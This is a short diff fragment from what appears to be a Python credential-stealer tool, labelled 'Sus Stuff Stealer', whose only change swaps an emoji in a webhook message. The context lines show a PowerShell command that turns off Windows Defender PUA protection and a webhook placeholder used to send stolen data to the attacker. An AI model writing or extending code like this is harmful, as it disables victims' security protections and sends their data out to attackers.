@@ -26,7 +26,7 @@ os.system("powershell.exe -command Set-MpPreference -PUAProtection disable")
 
 hook = Webhook("https://Your Webhook Url") #change this
 embed = Embed(
-    description='Sus Stuff Stealer From shin-kun! :smiley:',
+    description='Sus Stuff Stealer From shin-kun! :smirk:',
     color=0x5CDBF0,
     timestamp='now'  
     )
